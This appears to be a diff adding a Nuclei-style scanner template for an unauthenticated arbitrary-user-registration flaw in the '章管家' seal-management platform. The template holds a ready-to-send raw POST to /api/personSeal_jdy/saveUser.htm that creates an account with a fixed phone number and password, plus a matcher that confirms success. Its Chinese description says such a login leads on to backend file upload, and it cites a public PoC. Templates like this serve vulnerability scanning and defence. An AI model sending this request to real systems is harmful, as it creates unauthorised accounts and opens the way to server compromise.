@@ -1,0 +1,26 @@
+id: zgj-anyuser-register
+
+info:
+  name: 章管家 任意用户注册
+  author: qwtd
+  severity: medium
+  description: 返回200不一定是注册成功，但是如果能登录可以进行后台文件上传。参考下面reference文章
+  reference:
+    - https://github.com/MrWQ/vulnerability-wiki/blob/372343467ed8675f78d0d8a56d89324142a4c004/docs/POC/%E7%AB%A0%E7%AE%A1%E5%AE%B6-%E5%8D%B0%E7%AB%A0%E6%99%BA%E6%85%A7%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0/%E7%AB%A0%E7%AE%A1%E5%AE%B6%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(XVE-2024-19042).md
+  tags: 章管家
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /api/personSeal_jdy/saveUser.htm HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        {"op":{},"data":{"mobile":"13333333333","uid":"13333333333","password":"123456","name":"testuser","return_url":"https://www.baidu.com","apisecretkey":"1","_id":"1","mail_address":"111@qq.com"},"b7o4ntosbfp":"="}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200 && contains(body_1, "{\"code\":200}")
